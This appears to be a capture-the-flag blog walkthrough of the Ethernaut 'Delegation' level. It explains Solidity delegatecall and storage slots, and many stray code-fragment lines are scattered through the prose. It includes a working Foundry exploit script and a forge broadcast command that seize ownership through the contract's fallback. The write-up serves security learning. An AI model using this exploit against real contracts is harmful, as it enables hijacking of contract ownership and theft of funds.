@@ -1,0 +1,93 @@
+"This level wants us to claim the ownership of the contract to win. The concept hidden in this contract is called a Delegate Call or delegatecall(). Let's dive in. 
+delegatecall()
+A delegate call is a special low-level call in Solidity to make external calls to another contract. Solidity By Example does an excellent job of explaining this. 
+Let's assume there are two contracts, similar to the one shown in Ethernaut's Delegation level, contracts A and B.
+When contract A executes delegatecall to contract B, B's code is executed with contract A's storage, msg.sender and msg.value.
+A
+B
+A
+delegatecall
+B
+B
+A
+msg.sender
+msg.value
+This means that it is possible to modify a contract's storage using a code (malicious code) belonging to another contract. We will be exploiting this behavior in this blog. 
+The delegatecall has the following structure - 
+address.delegatecall(abi.encodeWithSignature(""func_signature"", ""arguments""));
+
+Let's first take a look at the Delegation contract. There's a fallback function:
+Delegation
+fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+        this;
+    }
+}
+
+We can see that the contract is making a delegate call to the address(delegate) or the first contract Delegate. This call is taking an input of msg.data which means whatever data was passed while calling the fallback function. Since we can trigger the fallback function, we can essentially control the msg.data passed inside the delegate call. 
+address(delegate)
+Delegate
+msg.data
+msg.data
+An interesting thing to note about delegate call is that whenever our user makes a call to contract Delegation, which in turn is making a delegate call to Delegate, the msg.sender received by the Delegate contract will be our user's address and not Delegation's address. 
+msg.sender
+Let's see the Delegate contract. There's an interesting pwn() function as shown below:
+Delegate
+pwn()
+function pwn() public {
+    owner = msg.sender;
+}
+
+This will just assign a new owner to whoever calls the function. Note that the address public owner; variable is in slot 0 in both contracts. 
+address public owner;
+The EVM stores each variable in slots - 
+contract Example {
+    uint256 first;  // slot 0
+    uint256 second; // slot 1
+}
+
+This plays an important role in exploitation. For proper storage mapping via a delegate call, the storage slot order should be the same otherwise the data will go into different variables. 
+To explain the slot arrangement, a whole other blog is needed so we won't be covering it here. It is recommended to go through this amazing article which explains it really well. 
+Things are coming together now. 
+To exploit this level:
+pwn()
+msg.data
+pwn()
+msg.sender
+owner
+Here's how our exploit code looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel06.sol"";
+
+contract POC is Script {
+    Delegation level6 = Delegation(0x36FcDCE0C27A8Fed39C1bF563FbC56359757D369);
+
+    function run() external {
+        vm.startBroadcast();
+
+        console.log(""Current owner is : "", level6.owner()); // checking current owner
+        (bool success, ) = address(level6).call(abi.encodeWithSignature(""pwn()"")); // triggering callback with my msg.data
+        console.log(""Checking delegatecall result : "", success); // checking result for delegatecall
+        console.log(""New owner is : "", level6.owner()); // confirming new owner
+
+        vm.stopBroadcast();
+    }
+}
+
+In the PoC above, we are making a call() to the Delegation contract. The msg.data can be seen taking the pwn() function selector. Since there's no such function in the Delegation contract, the fallback will be triggered and the same msg.data will be sent to the Delegate contract, therefore, calling the actual pwn() function and making us the owner of the Delegation contract. 
+call()
+msg.data
+pwn()
+msg.data
+pwn()
+Let's execute the script using 
+forge script ./script/level06.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL
+
+
+Now that we are the new owner, let's submit the instance to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+delegatecall()"
